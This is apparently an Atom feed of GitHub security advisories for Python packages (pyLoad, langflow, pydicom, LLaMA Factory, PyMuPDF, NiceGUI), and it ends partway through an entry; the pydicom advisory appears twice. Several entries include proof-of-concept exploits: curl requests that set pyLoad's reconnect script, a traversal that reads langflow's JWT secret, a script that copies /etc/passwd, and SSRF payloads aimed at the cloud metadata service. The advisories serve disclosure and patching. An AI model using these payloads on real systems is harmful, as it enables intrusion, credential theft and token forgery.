<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
    <title>Security Advisory for Python packages hosted at PyPI.org</title>
    <updated>2026-03-23T04:50:33.786Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
    <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[pyload-ng] pyLoad SETTINGS Permission Users Can Achieve Remote Code Execution via Unrestricted Reconnect Script Configuration]]></title>
        <id>https://github.com/advisories/GHSA-r7mc-x6x7-cqxx</id>
        <link href="https://github.com/advisories/GHSA-r7mc-x6x7-cqxx"/>
        <updated>2026-03-20T21:50:31.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The <code>set_config_value()</code> API endpoint allows users with the non-admin <code>SETTINGS</code> permission to modify any configuration option without restriction. The <code>reconnect.script</code> config option controls a file path that is passed directly to <code>subprocess.run()</code> in the thread manager's reconnect logic. A SETTINGS user can set this to any executable file on the system, achieving Remote Code Execution. The only validation in <code>set_config_value()</code> is a hardcoded check for <code>general.storage_folder</code> — all other security-critical settings including <code>reconnect.script</code> are writable without any allowlist or path restriction.</p>
<h2 id="details">Details</h2>
<p>The vulnerability chain spans two components:</p>
<p><strong>1. Unrestricted config write — <code>src/pyload/core/api/__init__.py:210-243</code></strong></p>
<pre><code class="language-python">@permission(Perms.SETTINGS)
@post
def set_config_value(self, category: str, option: str, value: Any, section: str = "core") -&gt; None:
    self.pyload.addon_manager.dispatch_event(
        "config_changed", category, option, value, section
    )
    if section == "core":
        if category == "general" and option == "storage_folder":
            # Forbid setting the download folder inside dangerous locations
            # ... validation only for storage_folder ...
            return

        self.pyload.config.set(category, option, value)  # No validation for any other option
</code></pre>
<p>The <code>Perms.SETTINGS</code> permission (value 128) is a non-admin permission flag. The only hardcoded validation is for <code>general.storage_folder</code>. The <code>reconnect.script</code> option is written directly to config with no path validation, allowlist, or sanitization.</p>
<p><strong>2. Arbitrary script execution — <code>src/pyload/core/managers/thread_manager.py:157-199</code></strong></p>
<pre><code class="language-python">def try_reconnect(self):
    if not (
        self.pyload.config.get("reconnect", "enabled")
        and self.pyload.api.is_time_reconnect()
    ):
        return False

    # ... checks if active downloads want reconnect ...

    reconnect_script = self.pyload.config.get("reconnect", "script")
    if not os.path.isfile(reconnect_script):
        self.pyload.config.set("reconnect", "enabled", False)
        self.pyload.log.warning(self._("Reconnect script not found!"))
        return

    # ... reconnect logic ...

    try:
        subprocess.run(reconnect_script)  # Executes attacker-controlled path
    except Exception:
        # ...
</code></pre>
<p>The <code>reconnect_script</code> value comes directly from config. The only check is <code>os.path.isfile()</code> — the file must exist but there is no allowlist, no path restriction, and no signature verification.</p>
<p><strong>3. Attacker also controls timing via same SETTINGS permission</strong></p>
<p>The attacker can set <code>reconnect.enabled=True</code>, <code>reconnect.start_time</code>, and <code>reconnect.end_time</code> through the same <code>set_config_value()</code> endpoint to control when execution occurs. <code>toggle_reconnect()</code> at line 321 requires only <code>Perms.STATUS</code> — an even lower privilege.</p>
<p><strong>4. Additional privilege escalation via config access</strong></p>
<p>Beyond RCE, the same unrestricted config write allows SETTINGS users to:</p>
<ul>
<li>Read proxy credentials (<code>proxy.username</code>/<code>proxy.password</code>) in plaintext via <code>get_config()</code></li>
<li>Redirect syslog to an attacker-controlled server (<code>log.syslog_host</code>/<code>log.syslog_port</code>)</li>
<li>Disable SSL (<code>webui.use_ssl=False</code>), rebind to <code>0.0.0.0</code> (<code>webui.host</code>)</li>
<li>Modify SSL certificate/key paths to enable MITM</li>
</ul>
<h2 id="poc">PoC</h2>
<p><strong>Step 1: Set reconnect script to an attacker-controlled executable</strong></p>
<p>Via API:</p>
<pre><code class="language-bash"># Authenticate and get session (as user with SETTINGS permission)
curl -c cookies.txt -X POST 'http://target:8000/api/login' \
  -d 'username=settingsuser&amp;password=pass123'

# Set reconnect script to a known executable on the system
curl -b cookies.txt -X POST 'http://target:8000/api/set_config_value' \
  -d 'category=reconnect&amp;option=script&amp;value=/tmp/exploit.sh&amp;section=core'
</code></pre>
<p>Via Web UI:</p>
<pre><code class="language-bash">curl -b cookies.txt -X POST 'http://target:8000/json/save_config?category=core' \
  -d 'reconnect|script=/tmp/exploit.sh&amp;reconnect|enabled=True'
</code></pre>
<p><strong>Step 2: Enable reconnect and set timing window</strong></p>
<pre><code class="language-bash">curl -b cookies.txt -X POST 'http://target:8000/api/set_config_value' \
  -d 'category=reconnect&amp;option=enabled&amp;value=True&amp;section=core'

curl -b cookies.txt -X POST 'http://target:8000/api/set_config_value' \
  -d 'category=reconnect&amp;option=start_time&amp;value=00:00&amp;section=core'

curl -b cookies.txt -X POST 'http://target:8000/api/set_config_value' \
  -d 'category=reconnect&amp;option=end_time&amp;value=23:59&amp;section=core'
</code></pre>
<p><strong>Step 3: Script executes when thread manager calls <code>try_reconnect()</code></strong></p>
<p>The thread manager's <code>run()</code> method (called repeatedly by the core loop) invokes <code>try_reconnect()</code>, which calls <code>subprocess.run(reconnect_script)</code> at <code>thread_manager.py:199</code>.</p>
<p><strong>Note on exploitation constraints:</strong> The file at the target path must exist (<code>os.path.isfile()</code> check) and be executable. With <code>shell=False</code> (subprocess.run default), no arguments are passed. If the attacker also has <code>ADD</code> permission (common for non-admin users), they can use pyLoad to download an archive containing an executable script, which may retain execute permissions after extraction.</p>
<h2 id="impact">Impact</h2>
<ul>
<li><strong>Remote Code Execution</strong>: A non-admin user with SETTINGS permission can execute arbitrary programs on the server as the pyLoad process user</li>
<li><strong>Privilege escalation</strong>: The SETTINGS permission is described as "can access settings" — granting it is not expected to grant arbitrary code execution capability</li>
<li><strong>Credential exposure</strong>: SETTINGS users can read proxy credentials, SSL key paths, and other sensitive config values via <code>get_config()</code></li>
<li><strong>Network reconfiguration</strong>: SETTINGS users can disable SSL, change bind address, redirect logging, and modify other security-critical network settings</li>
</ul>
<h2 id="recommended-fix">Recommended Fix</h2>
<p>Add an allowlist or category-level restriction in <code>set_config_value()</code> that prevents non-admin users from modifying security-critical options:</p>
<pre><code class="language-python"># In set_config_value(), after the storage_folder check:
ADMIN_ONLY_OPTIONS = {
    ("reconnect", "script"),
    ("webui", "host"),
    ("webui", "use_ssl"),
    ("webui", "ssl_cert"),
    ("webui", "ssl_key"),
    ("log", "syslog_host"),
    ("log", "syslog_port"),
    ("proxy", "username"),
    ("proxy", "password"),
}

if section == "core" and (category, option) in ADMIN_ONLY_OPTIONS:
    # Require ADMIN role for security-critical settings
    if not self.pyload.api.user_data.get("role") == Role.ADMIN:
        raise PermissionError(f"Admin role required to modify {category}.{option}")
</code></pre>
<p>Additionally, consider validating the <code>reconnect.script</code> path against an allowlist of directories or requiring admin approval for script path changes.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pyload/pyload/security/advisories/GHSA-r7mc-x6x7-cqxx">https://github.com/pyload/pyload/security/advisories/GHSA-r7mc-x6x7-cqxx</a></li>
<li><a href="https://github.com/pyload/pyload/commit/f5e284fcdfeaf08436bb03e5fcf697aaac659d8b">https://github.com/pyload/pyload/commit/f5e284fcdfeaf08436bb03e5fcf697aaac659d8b</a></li>
<li><a href="https://github.com/advisories/GHSA-r7mc-x6x7-cqxx">https://github.com/advisories/GHSA-r7mc-x6x7-cqxx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r7mc-x6x7-cqxx</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-20T21:50:30.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[langflow] langflow: /profile_pictures/{folder_name}/{file_name} endpoint file reading]]></title>
        <id>https://github.com/advisories/GHSA-ph9w-r52h-28p7</id>
        <link href="https://github.com/advisories/GHSA-ph9w-r52h-28p7"/>
        <updated>2026-03-20T20:56:17.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>In the download_profile_picture function of the /profile_pictures/{folder_name}/{file_name} endpoint, the folder_name and file_name parameters are not strictly filtered, which allows the secret_key to be read across directories.</p>
<h3 id="details">Details</h3>
<p>src/backend/base/langflow/api/v1/files.py</p>
<p><img src="https://github.com/user-attachments/assets/19bc387c-93d8-475b-bab0-2675669c1c36" alt="image"></p>
<p>storage local get_file, directly concatenate flow_id and file_name
<img src="https://github.com/user-attachments/assets/daf47b73-6e1b-414e-bb8b-66b67cf5a9e9" alt="image"></p>
<h3 id="poc">PoC</h3>
<p><code>curl --path-as-is 'http://127.0.0.1:7860/api/v1/files/profile_pictures/../secret_key' </code>
<code>QNuonm***********</code></p>
<h3 id="impact">Impact</h3>
<p>secret_key is used for jwt authentication. Attackers can forge authentication tokens and log into the system.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/langflow-ai/langflow/security/advisories/GHSA-ph9w-r52h-28p7">https://github.com/langflow-ai/langflow/security/advisories/GHSA-ph9w-r52h-28p7</a></li>
<li><a href="https://github.com/advisories/GHSA-ph9w-r52h-28p7">https://github.com/advisories/GHSA-ph9w-r52h-28p7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-ph9w-r52h-28p7</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-20T20:56:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[langflow] langflow has Unauthenticated IDOR on Image Downloads]]></title>
        <id>https://github.com/advisories/GHSA-7grx-3xcx-2xv5</id>
        <link href="https://github.com/advisories/GHSA-7grx-3xcx-2xv5"/>
        <updated>2026-03-20T20:47:12.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The <code>/api/v1/files/images/{flow_id}/{file_name}</code> endpoint serves image files without any authentication or ownership check. Any unauthenticated request with a known flow_id and file_name returns the image with HTTP 200.</p>
<h3 id="details">Details</h3>
<p><code>src/backend/base/langflow/api/v1/files.py:138-164</code> — <code>download_image</code> takes <code>flow_id</code>: UUID as a bare path parameter with no Depends(get_flow) or <code>CurrentActiveUser</code>. All other file routes (<code>download_file</code>, <code>upload_file</code>, <code>list_files</code>, <code>delete_file</code>) use <code>Depends(get_flow)</code> which enforces both authentication and ownership. There is no global auth middleware on /api/v1; protection is per-endpoint only.</p>
<h3 id="poc">PoC</h3>
<pre><code>curl -v "http://localhost:7860/api/v1/files/images/&lt;flow_uuid&gt;/&lt;filename.png&gt;"
# Returns HTTP 200 with image bytes, no auth header required
</code></pre>
<h3 id="impact">Impact</h3>
<p>Unauthenticated cross-tenant data leak. In a multi-tenant deployment, any attacker who can discover or guess a <code>flow_id</code> (UUIDs can be leaked through other API responses) can download any user's uploaded images without credentials.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/langflow-ai/langflow/security/advisories/GHSA-7grx-3xcx-2xv5">https://github.com/langflow-ai/langflow/security/advisories/GHSA-7grx-3xcx-2xv5</a></li>
<li><a href="https://github.com/advisories/GHSA-7grx-3xcx-2xv5">https://github.com/advisories/GHSA-7grx-3xcx-2xv5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7grx-3xcx-2xv5</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-20T20:47:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pydicom] pydicom has a path traversal in FileSet/DICOMDIR ReferencedFileID allows file access outside the File-set root]]></title>
        <id>https://github.com/advisories/GHSA-v856-2rf8-9f28</id>
        <link href="https://github.com/advisories/GHSA-v856-2rf8-9f28"/>
        <updated>2026-03-20T15:57:02.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A crafted <code>DICOMDIR</code> can set <code>ReferencedFileID</code> to a path outside the File-set root. <code>pydicom</code> resolves the path only to confirm that it exists, but does not verify that the resolved path remains under the File-set root. Subsequent public <code>FileSet</code> operations such as <code>copy()</code>, <code>write()</code>, and <code>remove()+write(use_existing=True)</code> use that unchecked path in file I/O operations. This allows arbitrary file read/copy and, in some flows, move/delete outside the File-set root.</p>
<h3 id="details">Details</h3>
<p>Verified on <code>pydicom 3.1.0.dev0</code>.</p>
<p>Relevant logic is in <code>src/pydicom/fileset.py</code>:</p>
<ul>
<li><code>RecordNode._file_id</code> converts <code>ReferencedFileID</code> directly to <code>Path(...)</code></li>
<li><code>FileSet.load()</code> checks only <code>(root / file_id).resolve(strict=True)</code> to confirm existence</li>
<li><code>FileSet.load()</code> does not verify that the final resolved path is contained within the File-set root</li>
<li><code>FileInstance.path</code> returns <code>self.file_set.path / self.node._file_id</code></li>
<li><code>FileSet.copy()</code> uses <code>shutil.copyfile(instance.path, dst)</code></li>
<li><code>FileSet.write()</code> uses <code>Path(instance.path).unlink()</code> and <code>shutil.move(...)</code></li>
</ul>
<p>Because there is no containment check such as <code>resolved.relative_to(root.resolve(strict=True))</code>, a malicious <code>DICOMDIR</code> can reference:</p>
<ul>
<li>absolute paths such as <code>/etc/passwd</code></li>
<li>traversal paths such as <code>../...</code></li>
<li>syntactically conformant file IDs that escape via symlinks</li>
</ul>
<p>This is not limited to obviously invalid VR input. Even when <code>pydicom</code> emits warnings for invalid <code>ReferencedFileID</code> values, the operation is not blocked. I also confirmed a symlink-based variant using a conformant file ID.</p>
<p>A realistic server-side scenario is:</p>
<ol>
<li>a user uploads a DICOM File-set zip</li>
<li>the server loads the uploaded <code>DICOMDIR</code> using <code>FileSet</code></li>
<li>the server re-exports or reorganizes the File-set using <code>FileSet.copy()</code> or <code>FileSet.write()</code></li>
<li>a server-local file referenced by the malicious <code>DICOMDIR</code> is included in the exported result</li>
</ol>
<h3 id="poc">PoC</h3>
<p>Minimal reproduction:</p>
<ol>
<li>Copy a sample File-set that contains a valid <code>DICOMDIR</code></li>
<li>Modify one <code>DirectoryRecordSequence</code> item so that <code>ReferencedFileID = "/etc/passwd"</code> (or <code>/tmp/secret.txt</code>)</li>
<li>Load it with <code>FileSet(ds)</code> or <code>FileSet(path_to_dicomdir)</code></li>
<li>Call <code>FileSet.copy(new_root)</code></li>
<li>Observe that the exported File-set contains the contents of the referenced external file</li>
</ol>
<p>Example:</p>
<pre><code class="language-python">from pathlib import Path
from tempfile import mkdtemp
import shutil
from pydicom import dcmread
from pydicom.fileset import FileSet

base = Path("src/pydicom/data/test_files/dicomdirtests")
root = Path(mkdtemp(prefix="fsroot_"))
out = Path(mkdtemp(prefix="fsout_"))

shutil.copy2(base / "DICOMDIR", root / "DICOMDIR")
for d in ("77654033", "98892003", "98892001"):
    shutil.copytree(base / d, root / d)

ds = dcmread(root / "DICOMDIR")
item = next(x for x in ds.DirectoryRecordSequence if "ReferencedFileID" in x)
item.ReferencedFileID = "/etc/passwd"

fs = FileSet(ds)
fs.copy(out)
</code></pre>
<p>I also verified the issue in a simple web import/export demo where an uploaded malicious File-set caused /etc/passwd to be copied into the exported result.</p>
<p>If useful, I can provide the exact malicious sample and the demo environment separately.</p>
<h3 id="impact">Impact</h3>
<p>This is a path traversal / root containment bypass in FileSet handling.</p>
<p>Observed impact:</p>
<p>arbitrary file read/copy outside the File-set root via FileSet.copy()
arbitrary file move outside the File-set root via FileSet.write()
arbitrary file delete outside the File-set root via FileSet.remove(...); write(use_existing=True)
Affected applications are those that accept untrusted DICOMDIR / File-set input and then call public FileSet workflows such as load(), copy(), write(), or remove().</p>
<p>A realistic impact is server-side file disclosure in import/export workflows.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pydicom/pydicom/security/advisories/GHSA-v856-2rf8-9f28">https://github.com/pydicom/pydicom/security/advisories/GHSA-v856-2rf8-9f28</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-32711">https://nvd.nist.gov/vuln/detail/CVE-2026-32711</a></li>
<li><a href="https://github.com/pydicom/pydicom/commit/6414f01a053dff925578799f5a7208d2ae585e82">https://github.com/pydicom/pydicom/commit/6414f01a053dff925578799f5a7208d2ae585e82</a></li>
<li><a href="https://github.com/pydicom/pydicom/releases/tag/v3.0.2">https://github.com/pydicom/pydicom/releases/tag/v3.0.2</a></li>
<li><a href="https://github.com/advisories/GHSA-v856-2rf8-9f28">https://github.com/advisories/GHSA-v856-2rf8-9f28</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v856-2rf8-9f28</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-20T15:57:01.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pydicom] pydicom has a path traversal in FileSet/DICOMDIR ReferencedFileID allows file access outside the File-set root]]></title>
        <id>https://github.com/advisories/GHSA-v856-2rf8-9f28</id>
        <link href="https://github.com/advisories/GHSA-v856-2rf8-9f28"/>
        <updated>2026-03-20T15:57:02.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A crafted <code>DICOMDIR</code> can set <code>ReferencedFileID</code> to a path outside the File-set root. <code>pydicom</code> resolves the path only to confirm that it exists, but does not verify that the resolved path remains under the File-set root. Subsequent public <code>FileSet</code> operations such as <code>copy()</code>, <code>write()</code>, and <code>remove()+write(use_existing=True)</code> use that unchecked path in file I/O operations. This allows arbitrary file read/copy and, in some flows, move/delete outside the File-set root.</p>
<h3 id="details">Details</h3>
<p>Verified on <code>pydicom 3.1.0.dev0</code>.</p>
<p>Relevant logic is in <code>src/pydicom/fileset.py</code>:</p>
<ul>
<li><code>RecordNode._file_id</code> converts <code>ReferencedFileID</code> directly to <code>Path(...)</code></li>
<li><code>FileSet.load()</code> checks only <code>(root / file_id).resolve(strict=True)</code> to confirm existence</li>
<li><code>FileSet.load()</code> does not verify that the final resolved path is contained within the File-set root</li>
<li><code>FileInstance.path</code> returns <code>self.file_set.path / self.node._file_id</code></li>
<li><code>FileSet.copy()</code> uses <code>shutil.copyfile(instance.path, dst)</code></li>
<li><code>FileSet.write()</code> uses <code>Path(instance.path).unlink()</code> and <code>shutil.move(...)</code></li>
</ul>
<p>Because there is no containment check such as <code>resolved.relative_to(root.resolve(strict=True))</code>, a malicious <code>DICOMDIR</code> can reference:</p>
<ul>
<li>absolute paths such as <code>/etc/passwd</code></li>
<li>traversal paths such as <code>../...</code></li>
<li>syntactically conformant file IDs that escape via symlinks</li>
</ul>
<p>This is not limited to obviously invalid VR input. Even when <code>pydicom</code> emits warnings for invalid <code>ReferencedFileID</code> values, the operation is not blocked. I also confirmed a symlink-based variant using a conformant file ID.</p>
<p>A realistic server-side scenario is:</p>
<ol>
<li>a user uploads a DICOM File-set zip</li>
<li>the server loads the uploaded <code>DICOMDIR</code> using <code>FileSet</code></li>
<li>the server re-exports or reorganizes the File-set using <code>FileSet.copy()</code> or <code>FileSet.write()</code></li>
<li>a server-local file referenced by the malicious <code>DICOMDIR</code> is included in the exported result</li>
</ol>
<h3 id="poc">PoC</h3>
<p>Minimal reproduction:</p>
<ol>
<li>Copy a sample File-set that contains a valid <code>DICOMDIR</code></li>
<li>Modify one <code>DirectoryRecordSequence</code> item so that <code>ReferencedFileID = "/etc/passwd"</code> (or <code>/tmp/secret.txt</code>)</li>
<li>Load it with <code>FileSet(ds)</code> or <code>FileSet(path_to_dicomdir)</code></li>
<li>Call <code>FileSet.copy(new_root)</code></li>
<li>Observe that the exported File-set contains the contents of the referenced external file</li>
</ol>
<p>Example:</p>
<pre><code class="language-python">from pathlib import Path
from tempfile import mkdtemp
import shutil
from pydicom import dcmread
from pydicom.fileset import FileSet

base = Path("src/pydicom/data/test_files/dicomdirtests")
root = Path(mkdtemp(prefix="fsroot_"))
out = Path(mkdtemp(prefix="fsout_"))

shutil.copy2(base / "DICOMDIR", root / "DICOMDIR")
for d in ("77654033", "98892003", "98892001"):
    shutil.copytree(base / d, root / d)

ds = dcmread(root / "DICOMDIR")
item = next(x for x in ds.DirectoryRecordSequence if "ReferencedFileID" in x)
item.ReferencedFileID = "/etc/passwd"

fs = FileSet(ds)
fs.copy(out)
</code></pre>
<p>I also verified the issue in a simple web import/export demo where an uploaded malicious File-set caused /etc/passwd to be copied into the exported result.</p>
<p>If useful, I can provide the exact malicious sample and the demo environment separately.</p>
<h3 id="impact">Impact</h3>
<p>This is a path traversal / root containment bypass in FileSet handling.</p>
<p>Observed impact:</p>
<p>arbitrary file read/copy outside the File-set root via FileSet.copy()
arbitrary file move outside the File-set root via FileSet.write()
arbitrary file delete outside the File-set root via FileSet.remove(...); write(use_existing=True)
Affected applications are those that accept untrusted DICOMDIR / File-set input and then call public FileSet workflows such as load(), copy(), write(), or remove().</p>
<p>A realistic impact is server-side file disclosure in import/export workflows.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pydicom/pydicom/security/advisories/GHSA-v856-2rf8-9f28">https://github.com/pydicom/pydicom/security/advisories/GHSA-v856-2rf8-9f28</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-32711">https://nvd.nist.gov/vuln/detail/CVE-2026-32711</a></li>
<li><a href="https://github.com/pydicom/pydicom/commit/6414f01a053dff925578799f5a7208d2ae585e82">https://github.com/pydicom/pydicom/commit/6414f01a053dff925578799f5a7208d2ae585e82</a></li>
<li><a href="https://github.com/pydicom/pydicom/releases/tag/v3.0.2">https://github.com/pydicom/pydicom/releases/tag/v3.0.2</a></li>
<li><a href="https://github.com/advisories/GHSA-v856-2rf8-9f28">https://github.com/advisories/GHSA-v856-2rf8-9f28</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v856-2rf8-9f28</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-20T15:57:01.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[llamafactory] LLaMA Factory's Chat API Contains Critical SSRF and LFI Vulnerabilities]]></title>
        <id>https://github.com/advisories/GHSA-527m-2xhr-j27g</id>
        <link href="https://github.com/advisories/GHSA-527m-2xhr-j27g"/>
        <updated>2026-03-19T20:51:00.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>A Server-Side Request Forgery (SSRF) vulnerability in the chat API allows any authenticated user to force the server to make arbitrary HTTP requests to internal and external networks. This can lead to the exposure of sensitive internal services, reconnaissance of the internal network, or interaction with third-party services. The same mechanism also allows for a Local File Inclusion (LFI) vulnerability, enabling users to read arbitrary files from the server's filesystem.</p>
<h2 id="details">Details</h2>
<p>The vulnerability exists in the _process_request function within src/llamafactory/api/chat.py. This function is responsible for processing incoming multimodal content, including images, videos, and audio provided via URLs.</p>
<p>The function checks if the provided URL is a base64 data URI or a local file path (os.path.isfile). If neither is true, it falls back to treating the URL as a web URI and makes a direct HTTP GET request using requests.get(url, stream=True).raw without any validation or sanitization of the URL.</p>
<p>Vulnerable Code Snippets in _process_request:</p>
<pre><code># ...
        elif input_item.type == "image_url":
            # ...
            else:  # web uri
                image_stream = requests.get(image_url, stream=True).raw
# ...
        elif input_item.type == "video_url":
            # ...
            else:  # web uri
                video_stream = requests.get(video_url, stream=True).raw
# ...
        elif input_item.type == "audio_url":
            # ...
            else:  # web uri
                audio_stream = requests.get(audio_url, stream=True).raw
# ...
</code></pre>
<p>This vulnerable function is called by create_chat_completion_response and create_stream_chat_completion_response, which are in turn called by the public-facing /v1/chat/completions API endpoint in src/llamafactory/api/app.py. A user can craft a request to this endpoint containing a malicious URL in the messages payload to trigger the vulnerability.</p>
<h2 id="poc">PoC</h2>
<p>To reproduce the vulnerability, send a POST request to the /v1/chat/completions endpoint with a JSON payload containing a URL that points to an internal or controlled external service.</p>
<p>Start the LLaMA Factory API server.</p>
<p>Use curl to send the malicious request. The following example uses a URL pointing to the AWS metadata service, a common SSRF attack vector.</p>
<p>SSRF Payload:</p>
<pre><code>curl -X POST "http://127.0.0.1:8000/v1/chat/completions" \
-H "Content-Type: application/json" \
-H "Authorization: Bearer your_api_key" \
-d '{
  "model": "your-model-name",
  "messages": [
    {
      "role": "user",
      "content": [
        {
          "type": "text",
          "text": "What is in this image?"
        },
        {
          "type": "image_url",
          "image_url": {
            "url": "http://169.254.169.254/latest/meta-data/"
          }
        }
      ]
    }
  ]
}'
</code></pre>
<p>LFI Payload:</p>
<pre><code>curl -X POST "http://127.0.0.1:8000/v1/chat/completions" \
-H "Content-Type: application/json" \
-H "Authorization: Bearer your_api_key" \
-d '{
  "model": "your-model-name",
  "messages": [
    {
      "role": "user",
      "content": [
        {
          "type": "text",
          "text": "What is in this image?"
        },
        {
          "type": "image_url",
          "image_url": {
            "url": "/etc/passwd"
          }
        }
      ]
    }
  ]
}'
</code></pre>
<p>The server will make a request to the specified URL or read the specified local file.</p>
<h2 id="impact">Impact</h2>
<p>Vulnerability Type: Server-Side Request Forgery (SSRF) and Local File Inclusion (LFI).</p>
<p>Impacted Component: The API server, specifically the /v1/chat/completions endpoint.</p>
<p>Who is impacted: Any user who can send requests to the chat API. The vulnerability allows an attacker to bypass firewalls and access internal network resources, query cloud metadata services for credentials, or read sensitive files on the server. The severity is critical.</p>
<h2 id="credits">Credits</h2>
<p>Wenhao Wu, ChengGao, Alibaba Cloud Intelligence Security Team</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-61784">https://nvd.nist.gov/vuln/detail/CVE-2025-61784</a></li>
<li><a href="https://github.com/hiyouga/LlamaFactory/security/advisories/GHSA-527m-2xhr-j27g">https://github.com/hiyouga/LlamaFactory/security/advisories/GHSA-527m-2xhr-j27g</a></li>
<li><a href="https://github.com/hiyouga/LLaMAFactory/commit/95b7188090a1018935c9dc072bfc97f24f1c96e9">https://github.com/hiyouga/LLaMAFactory/commit/95b7188090a1018935c9dc072bfc97f24f1c96e9</a></li>
<li><a href="https://github.com/advisories/GHSA-527m-2xhr-j27g">https://github.com/advisories/GHSA-527m-2xhr-j27g</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-527m-2xhr-j27g</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-10-07T22:08:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[PyMuPDF] PyMuPDF has a path traversal in _main_.py]]></title>
        <id>https://github.com/advisories/GHSA-cxqh-p2w9-fmr7</id>
        <link href="https://github.com/advisories/GHSA-cxqh-p2w9-fmr7"/>
        <updated>2026-03-19T19:37:55.000Z</updated>
        <content type="html"><![CDATA[<p>A path traversal and arbitrary file write vulnerability exist in the embedded get function in '<em>main</em>.py' in PyMuPDF version, 1.26.5.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-3029">https://nvd.nist.gov/vuln/detail/CVE-2026-3029</a></li>
<li><a href="https://www.kb.cert.org/vuls/id/504749">https://www.kb.cert.org/vuls/id/504749</a></li>
<li><a href="http://github.com/pymupdf/PyMuPDF">http://github.com/pymupdf/PyMuPDF</a></li>
<li><a href="http://github.com/pymupdf/PyMuPDF/commit/603cafe38a183b8bab34f16d05043b4185d8d40a">http://github.com/pymupdf/PyMuPDF/commit/603cafe38a183b8bab34f16d05043b4185d8d40a</a></li>
<li><a href="https://github.com/advisories/GHSA-cxqh-p2w9-fmr7">https://github.com/advisories/GHSA-cxqh-p2w9-fmr7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cxqh-p2w9-fmr7</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-19T18:31:18.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nicegui] NiceGUI's unvalidated chunk size parameter in media routes can cause memory exhaustion]]></title>
        <id>https://github.com/advisories/GHSA-w5g8-5849-vj76</id>
        <link href="https://github.com/advisories/GHSA-w5g8-5849-vj76"/>
        <updated>2026-03-19T18:48:28.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>NiceGUI's <code>app.add_media_file()</code> and <code>app.add_media_files()</code> media routes accept a user-controlled query parameter that influences how files are read during streaming. The parameter is passed to the range-response implementation without validation, allowing an attacker to bypass chunked streaming and force the server to load entire files into memory at once.</p>
<p>With large media files and concurrent requests, this can lead to excessive memory consumption, degraded performance, or denial of service.</p>
<h2 id="impact">Impact</h2>
<p><strong>Affected applications:</strong> NiceGUI applications that serve media content via <code>app.add_media_file()</code> or <code>app.add_media_files()</code>, particularly those serving large files (video, audio).</p>
<p><strong>What an attacker can do:</strong></p>
<ul>
<li>Force the server to load entire files into memory instead of streaming them in chunks</li>
<li>Amplify memory usage with concurrent requests to large media files</li>
<li>Cause performance degradation, memory pressure, and potential OOM conditions</li>
</ul>
<p><strong>Attack difficulty:</strong> Low - requires only a crafted query parameter.</p>
<h2 id="remediation">Remediation</h2>
<p>Upgrade to a patched version of NiceGUI.</p>
<p>As a workaround, restrict access to media endpoints or strip unexpected query parameters at a reverse proxy layer.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/zauberzeug/nicegui/security/advisories/GHSA-w5g8-5849-vj76">https://github.com/zauberzeug/nicegui/security/advisories/GHSA-w5g8-5849-vj76</a></li>
